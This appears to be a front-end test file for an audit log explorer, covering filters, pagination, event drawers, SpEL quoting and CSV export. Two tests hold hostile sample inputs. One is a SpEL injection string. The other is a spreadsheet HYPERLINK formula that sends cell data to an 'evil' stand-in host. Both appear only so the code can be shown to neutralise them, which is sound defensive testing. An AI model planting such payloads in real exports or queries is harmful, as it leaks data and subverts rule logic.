import { screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import type { AuditLogRow } from '../api/types';
import { auditLogCsv } from '../util/csv';
import { spelStringLiteral } from '../util/spel';
import { PAGE_SIZE } from '../pages/AuditLogPage';
import { ALERTS, callsTo, jsonResponse, renderApp } from './helpers';

function row(i: number, overrides: Partial<AuditLogRow> = {}): AuditLogRow {
  return {
    eventId: `evt-${i}`,
    userId: 'boris',
    sessionId: null,
    occurredAt: new Date(Date.UTC(2026, 8, 7, 12, 0, 0) - i * 60_000).toISOString(),
    eventType: 'AUTH_EVENT',
    resource: 'login',
    action: 'LOGIN_FAILURE',
    riskLevel: 'MEDIUM',
    anomalous: false,
    controls: 'SOC2:AC-2,SOC2:IA-2',
    ...overrides,
  };
}

const ROWS: AuditLogRow[] = [
  row(1),
  row(2, { eventType: 'DATA_EXPORT', resource: 'customers_table', action: 'EXPORT', riskLevel: 'CRITICAL', anomalous: true, controls: 'GDPR:Art-30', userId: 'dana' }),
];

describe('audit log explorer', () => {
  it('lists the window newest first and puts every filter in the URL and the query', async () => {
    const user = userEvent.setup();
    const { fetchMock } = renderApp('/audit-log?range=7d', {
      'GET /api/v1/audit-logs': () => jsonResponse(ROWS),
    });

    expect(await screen.findByRole('heading', { name: 'Audit log' })).toBeInTheDocument();
    const table = await screen.findByRole('table', { name: 'Audit events, newest first' });
    expect(within(table).getAllByRole('row')).toHaveLength(3);
    expect(within(table).getByText('customers_table')).toBeInTheDocument();
    expect(within(table).getByText('Critical')).toBeInTheDocument();
    expect(within(table).getByText('Anomalous')).toBeInTheDocument();
    expect(within(table).getByText('GDPR Art-30')).toBeInTheDocument();
    expect(screen.getByText('2 events shown')).toBeInTheDocument();

    const first = callsTo(fetchMock, 'GET', '/api/v1/audit-logs')[0];
    expect(first.searchParams.get('limit')).toBe(String(PAGE_SIZE));
    expect(first.searchParams.has('type')).toBe(false);
    expect(first.searchParams.has('from')).toBe(true);

    await user.selectOptions(screen.getByLabelText('Type'), 'DATA_EXPORT');
    await user.selectOptions(screen.getByLabelText('Risk'), 'CRITICAL');
    await user.click(screen.getByLabelText('Anomalous only'));
    await user.type(screen.getByLabelText('User'), 'dana');
    await user.type(screen.getByLabelText('Search'), 'custom');
    await user.click(screen.getByRole('button', { name: 'Apply' }));

    await waitFor(() => {
      const calls = callsTo(fetchMock, 'GET', '/api/v1/audit-logs');
      const last = calls[calls.length - 1];
      expect(last.searchParams.get('type')).toBe('DATA_EXPORT');
      expect(last.searchParams.get('riskLevel')).toBe('CRITICAL');
      expect(last.searchParams.get('anomalous')).toBe('true');
      expect(last.searchParams.get('userId')).toBe('dana');
      expect(last.searchParams.get('q')).toBe('custom');
    });
    // the range in the sidebar links is still the one from the URL
    expect(screen.getByRole('link', { name: 'Dashboard' })).toHaveAttribute('href', '/dashboard?range=7d');

    await user.click(screen.getByRole('button', { name: 'Clear' }));
    await waitFor(() => {
      const calls = callsTo(fetchMock, 'GET', '/api/v1/audit-logs');
      expect(calls[calls.length - 1].searchParams.has('type')).toBe(false);
    });
  });

  it('loads older pages with the oldest timestamp as the cursor and stops at the end', async () => {
    const user = userEvent.setup();
    const firstPage = Array.from({ length: PAGE_SIZE }, (_, i) => row(i));
    const secondPage = [row(PAGE_SIZE), row(PAGE_SIZE + 1)];
    const { fetchMock } = renderApp('/audit-log', {
      'GET /api/v1/audit-logs': (url) => jsonResponse(url.searchParams.get('to') === firstPage[PAGE_SIZE - 1].occurredAt ? secondPage : firstPage),
    });

    expect(await screen.findByText(`${PAGE_SIZE} events shown`)).toBeInTheDocument();
    await user.click(screen.getByRole('button', { name: 'Load older' }));

    expect(await screen.findByText(`${PAGE_SIZE + 2} events shown`)).toBeInTheDocument();
    const calls = callsTo(fetchMock, 'GET', '/api/v1/audit-logs');
    expect(calls[calls.length - 1].searchParams.get('to')).toBe(firstPage[PAGE_SIZE - 1].occurredAt);
    expect(screen.queryByRole('button', { name: 'Load older' })).not.toBeInTheDocument();
    expect(screen.getByText('That is everything in this window.')).toBeInTheDocument();
  });

  it('opens an event in a drawer from the row and from a deep link, with its alerts', async () => {
    const user = userEvent.setup();
    renderApp('/audit-log?event=evt-2&range=30d', {
      'GET /api/v1/audit-logs': () => jsonResponse(ROWS),
      'GET /api/v1/audit-logs/evt-2': () => jsonResponse({ event: ROWS[1], alerts: [ALERTS[0]] }),
      'GET /api/v1/audit-logs/evt-1': () => jsonResponse({ event: ROWS[0], alerts: [] }),
    });

    const drawer = await screen.findByRole('dialog', { name: 'Event' });
    expect(await within(drawer).findByText('customers_table')).toBeInTheDocument();
    expect(within(drawer).getByText('GDPR Art-30')).toBeInTheDocument();
    expect(within(drawer).getByRole('link', { name: 'Failed login attempt' })).toHaveAttribute('href', '/alerts/al-1?range=30d');
    expect(within(drawer).getByText(/not delivered: email/)).toBeInTheDocument();

    await user.keyboard('{Escape}');
    await waitFor(() => expect(screen.queryByRole('dialog')).not.toBeInTheDocument());

    await user.click(screen.getByRole('button', { name: 'Open event evt-1' }));
    const second = await screen.findByRole('dialog', { name: 'Event' });
    expect(await within(second).findByText('No rule fired on this event.')).toBeInTheDocument();
  });

  it('"create rule from this event" carries the event into the rule editor, quoting the SpEL way', async () => {
    const user = userEvent.setup();
    renderApp('/audit-log?event=evt-2&range=30d', {
      'GET /api/v1/audit-logs': () => jsonResponse(ROWS),
      'GET /api/v1/audit-logs/evt-2': () => jsonResponse({ event: { ...ROWS[1], action: "O'Brien's export" }, alerts: [] }),
    });

    await screen.findByRole('dialog', { name: 'Event' });
    await user.click(await screen.findByRole('button', { name: 'Create rule from this event' }));
    expect(await screen.findByRole('heading', { name: 'Rules' })).toBeInTheDocument();
  });

  it('pre-fills the condition with SpEL quoting, not backslashes', () => {
    expect(spelStringLiteral("O'Brien's export")).toBe("'O''Brien''s export'");
    expect(spelStringLiteral("x' or true == true or resource == 'y")).toBe("'x'' or true == true or resource == ''y'");
    expect(spelStringLiteral('plain')).toBe("'plain'");
  });

  it('exports what is on screen as CSV, with formula-looking cells neutralised', () => {
    const csv = auditLogCsv([
      row(1),
      row(2, { resource: 'a "quoted", thing', action: null }),
      row(3, { resource: '=HYPERLINK("https://evil/?"&A1,"click")', action: '+1', userId: '@SUM(1)', sessionId: '-x' }),
    ]);
    const lines = csv.split('\r\n');
    expect(lines[0]).toBe('eventId,occurredAt,eventType,userId,sessionId,resource,action,riskLevel,anomalous,controls');
    expect(lines[1]).toBe('evt-1,2026-09-07T11:59:00.000Z,AUTH_EVENT,boris,,login,LOGIN_FAILURE,MEDIUM,false,"SOC2:AC-2,SOC2:IA-2"');
    expect(lines[2]).toContain('"a ""quoted"", thing",,MEDIUM');
    expect(lines[3]).toContain(`'@SUM(1),'-x,"'=HYPERLINK(""https://evil/?""&A1,""click"")",'+1,MEDIUM`);
    expect(lines[4]).toBe('');
  });

  it('shows empty and error states', async () => {
    const user = userEvent.setup();
    let calls = 0;
    renderApp('/audit-log?type=API_CALL', {
      'GET /api/v1/audit-logs': () => (calls++ === 0 ? jsonResponse({ error: 'bad_request', message: "'type' must be one of [...]" }, 400) : jsonResponse([])),
    });
    expect(await screen.findByRole('alert')).toHaveTextContent("'type' must be one of");
    await user.click(screen.getByRole('button', { name: 'Retry' }));
    expect(await screen.findByText('No events match these filters')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Export CSV' })).toBeDisabled();
    vi.useRealTimers();
  });
});
